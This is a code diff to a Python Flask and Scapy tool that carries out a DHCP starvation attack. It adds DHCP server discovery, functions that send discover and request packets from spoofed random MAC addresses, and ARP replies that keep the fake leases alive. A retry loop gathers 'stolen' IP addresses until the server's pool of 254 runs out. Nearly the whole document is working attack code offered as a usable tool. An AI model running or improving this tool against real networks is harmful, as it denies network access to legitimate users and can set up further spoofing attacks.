@@ -9,7 +9,7 @@ from flask import Flask, render_template, jsonify, request
 from scapy.all import *
 from scapy.layers.dhcp import DHCP, BOOTP
 from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
+from scapy.layers.l2 import Ether, ARP
 import threading
 import time
 import random
@@ -80,126 +80,228 @@ def get_network_interfaces():
 
 
 def discover_dhcp_server(interface):
-    """Discover DHCP server on the network"""
+    """Discover DHCP server on the network - improved version"""
     global network_info
     
     try:
-        # Create DHCP discover packet
+        print(f"[*] Discovering DHCP server on interface: {interface}")
+        
+        # Generate random MAC for discovery
         mac = RandMAC()
-        discover = (
-            Ether(dst="ff:ff:ff:ff:ff:ff") /
-            IP(src="0.0.0.0", dst="255.255.255.255") /
-            UDP(sport=68, dport=67) /
-            BOOTP(chaddr=mac) /
-            DHCP(options=[("message-type", "discover"), "end"])
-        )
         
-        # Send and wait for response
-        ans, _ = srp(discover, iface=interface, timeout=5, verbose=0)
+        # Create DHCP discover packet
+        discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
+        discover /= IP(src="0.0.0.0", dst="255.255.255.255")
+        discover /= UDP(sport=68, dport=67)
+        discover /= BOOTP(chaddr=mac2str(mac), xid=random.randint(1, 1000000000), flags=0xFFFFFF)
+        discover /= DHCP(options=[("message-type", "discover"), "end"])
         
-        if ans:
-            for _, rcv in ans:
-                if DHCP in rcv:
-                    dhcp_options = rcv[DHCP].options
-                    server_ip = None
-                    router_ip = None
-                    subnet_mask = None
-                    dhcp_pool_start = None
-                    dhcp_pool_end = None
-                    
-                    for option in dhcp_options:
-                        if isinstance(option, tuple):
-                            if option[0] == 'server_id':
-                                server_ip = option[1]
-                            elif option[0] == 'router':
-                                router_ip = option[1]
-                            elif option[0] == 'subnet_mask':
-                                subnet_mask = option[1]
-                    
-                    # Store network info
-                    network_info = {
-                        'server_ip': server_ip,
-                        'router_ip': router_ip,
-                        'subnet_mask': subnet_mask,
-                        'dhcp_pool_start': rcv[BOOTP].yiaddr,
-                        'dhcp_pool_end': 'Unknown (estimated from responses)'
-                    }
-                    
-                    return server_ip
+        # Send discover packet
+        print("[*] Sending DHCP discover...")
+        sendp(discover, iface=interface, verbose=0)
         
+        # Sniff for DHCP offer
+        print("[*] Waiting for DHCP offer...")
+        packets = sniff(count=1, filter="udp and (port 67 or 68)", timeout=10, iface=interface)
+        
+        if not packets:
+            print("[-] No DHCP offer received")
+            return None
+        
+        # Process the response
+        for packet in packets:
+            if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
+                server_ip = packet[IP].src
+                offered_ip = packet[BOOTP].yiaddr
+                
+                # Extract DHCP options
+                router_ip = None
+                subnet_mask = None
+                server_id = None
+                
+                for option in packet[DHCP].options:
+                    if isinstance(option, tuple):
+                        if option[0] == 'server_id':
+                            server_id = option[1]
+                        elif option[0] == 'router':
+                            router_ip = option[1]
+                        elif option[0] == 'subnet_mask':
+                            subnet_mask = option[1]
+                
+                # Store network info
+                network_info = {
+                    'server_ip': server_id or server_ip,
+                    'router_ip': router_ip,
+                    'subnet_mask': subnet_mask,
+                    'dhcp_pool_start': offered_ip,
+                    'dhcp_pool_end': 'Dynamic (detected during attack)'
+                }
+                
+                print(f"[+] DHCP server found: {server_id or server_ip}")
+                print(f"[+] Offered IP: {offered_ip}")
+                
+                return server_id or server_ip
+        
+        print("[-] No valid DHCP offer found")
         return None
+        
     except Exception as e:
-        print(f"Error discovering DHCP: {e}")
+        print(f"[-] Error discovering DHCP: {e}")
+        import traceback
+        traceback.print_exc()
         return None
+
+
+def dhcp_send_discover(spoofed_mac, interface):
+    """Send DHCP discover packet"""
+    discover = Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff", type=0x0800)
+    discover /= IP(src='0.0.0.0', dst='255.255.255.255')
+    discover /= UDP(sport=68, dport=67)
+    discover /= BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000), flags=0xFFFFFF)
+    discover /= DHCP(options=[("message-type", "discover"), "end"])
+    
+    sendp(discover, iface=interface, verbose=0)
+    print(f"[*] DHCP Discover sent from {spoofed_mac}")
+
+
+def dhcp_send_request(req_ip, spoofed_mac, server_ip, interface):
+    """Send DHCP request for a specific IP"""
+    request = Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff")
+    request /= IP(src="0.0.0.0", dst="255.255.255.255")
+    request /= UDP(sport=68, dport=67)
+    request /= BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000))
+    request /= DHCP(options=[
+        ("message-type", "request"),
+        ("server_id", server_ip),
+        ("requested_addr", req_ip),
+        "end"
+    ])
+    
+    sendp(request, iface=interface, verbose=0)
+    print(f"[+] DHCP Request sent for {req_ip}")
+
+
+def send_arp_reply(src_ip, source_mac, server_ip, server_mac, interface):
+    """Send ARP reply to maintain the lease"""
+    try:
+        reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
+        send(reply, iface=interface, verbose=0)
+        print(f"[*] ARP reply sent for {src_ip}")
+    except Exception as e:
+        print(f"[-] ARP reply error: {e}")
 
 
 def dhcp_starvation_attack(interface, dhcp_server):
-    """Perform DHCP starvation attack"""
+    """Perform DHCP starvation attack - improved version"""
     global stolen_ips, attack_running, stop_attack_flag
     
     stop_attack_flag.clear()
     
+    # Get server MAC address
+    server_mac = None
     try:
-        packet_count = 0
+        print(f"[*] Getting DHCP server MAC address for {dhcp_server}...")
+        arp_response = sr1(ARP(op=1, pdst=str(dhcp_server)), timeout=3, verbose=0)
+        if arp_response:
+            server_mac = arp_response[ARP].hwsrc
+            print(f"[+] Server MAC: {server_mac}")
+        else:
+            print("[-] Could not get server MAC, ARP replies will be skipped")
+    except Exception as e:
+        print(f"[-] ARP error: {e}")
+    
+    try:
         while attack_running and not stop_attack_flag.is_set():
             # Generate random MAC address
             mac = RandMAC()
             
-            # Create DHCP discover packet
-            discover = (
-                Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
-                IP(src="0.0.0.0", dst="255.255.255.255") /
-                UDP(sport=68, dport=67) /
-                BOOTP(chaddr=mac, xid=random.randint(1, 900000000)) /
-                DHCP(options=[("message-type", "discover"), "end"])
-            )
+            # Send DHCP discover
+            dhcp_send_discover(spoofed_mac=mac, interface=interface)
             
-            # Send discover and wait for offer
-            ans, _ = srp(discover, iface=interface, timeout=2, verbose=0)
+            # Wait for DHCP offer with retry logic
+            retry_count = 0
+            max_retries = 3
             
-            for _, rcv in ans:
-                if DHCP in rcv and BOOTP in rcv:
-                    offered_ip = rcv[BOOTP].yiaddr
-                    
-                    # Send DHCP request for the offered IP
-                    request = (
-                        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
-                        IP(src="0.0.0.0", dst="255.255.255.255") /
-                        UDP(sport=68, dport=67) /
-                        BOOTP(chaddr=mac, xid=random.randint(1, 900000000)) /
-                        DHCP(options=[
-                            ("message-type", "request"),
-                            ("requested_addr", offered_ip),
-                            ("server_id", dhcp_server),
-                            "end"
-                        ])
-                    )
-                    
-                    # Send request
-                    srp(request, iface=interface, timeout=1, verbose=0)
-                    
-                    # Add to stolen IPs if not already present
-                    ip_entry = {
-                        'ip': offered_ip,
-                        'mac': str(mac),
-                        'time': time.strftime('%H:%M:%S')
-                    }
-                    
-                    if not any(ip['ip'] == offered_ip for ip in stolen_ips):
-                        stolen_ips.append(ip_entry)
-                        packet_count += 1
+            while retry_count < max_retries:
+                print(f"[*] Waiting for DHCP offer (attempt {retry_count + 1}/{max_retries})...")
+                
+                # Sniff for DHCP response
+                packets = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3, iface=interface)
+                
+                if not packets:
+                    retry_count += 1
+                    if retry_count < max_retries:
+                        print("[-] No offer received, retrying...")
+                        dhcp_send_discover(spoofed_mac=mac, interface=interface)
+                    continue
+                
+                # Process DHCP offer
+                packet = packets[0]
+                if DHCP in packet:
+                    # Check if it's a DHCP offer (message-type = 2)
+                    if packet[DHCP].options[0][1] == 2:
+                        offered_ip = packet[BOOTP].yiaddr
+                        server_ip_from_offer = packet[IP].src
+                        
+                        # Check if it's from our target server
+                        if server_ip_from_offer == dhcp_server or dhcp_server == "0":
+                            print(f"[+] DHCP Offer received: {offered_ip}")
+                            
+                            # Send DHCP request
+                            dhcp_send_request(
+                                req_ip=str(offered_ip),
+                                spoofed_mac=mac,
+                                server_ip=str(dhcp_server),
+                                interface=interface
+                            )
+                            
+                            # Send ARP reply to maintain lease
+                            if server_mac:
+                                send_arp_reply(
+                                    src_ip=str(offered_ip),
+                                    source_mac=mac,
+                                    server_ip=str(dhcp_server),
+                                    server_mac=server_mac,
+                                    interface=interface
+                                )
+                            
+                            # Add to stolen IPs
+                            ip_entry = {
+                                'ip': offered_ip,
+                                'mac': str(mac),
+                                'time': time.strftime('%H:%M:%S')
+                            }
+                            
+                            if not any(ip['ip'] == offered_ip for ip in stolen_ips):
+                                stolen_ips.append(ip_entry)
+                                print(f"[✓] IP {offered_ip} acquired! Total: {len(stolen_ips)}")
+                            
+                            # Break out of retry loop
+                            break
+                        else:
+                            print(f"[-] Offer from different server: {server_ip_from_offer}")
+                            retry_count += 1
+                    else:
+                        print(f"[-] Unexpected DHCP message type: {packet[DHCP].options[0][1]}")
+                        retry_count += 1
+                else:
+                    retry_count += 1
             
-            # Small delay to avoid overwhelming the network
-            time.sleep(0.1)
+            # Small delay between requests
+            time.sleep(0.2)
             
-            # Limit to 254 addresses
+            # Check if pool is exhausted
             if len(stolen_ips) >= 254:
+                print("[!] Pool exhausted (254 IPs acquired)")
                 break
                 
     except Exception as e:
-        print(f"Attack error: {e}")
+        print(f"[-] Attack error: {e}")
+        import traceback
+        traceback.print_exc()
     finally:
         attack_running = False
+        print(f"[*] Attack stopped. Total IPs acquired: {len(stolen_ips)}")
 
 
 @app.route('/')
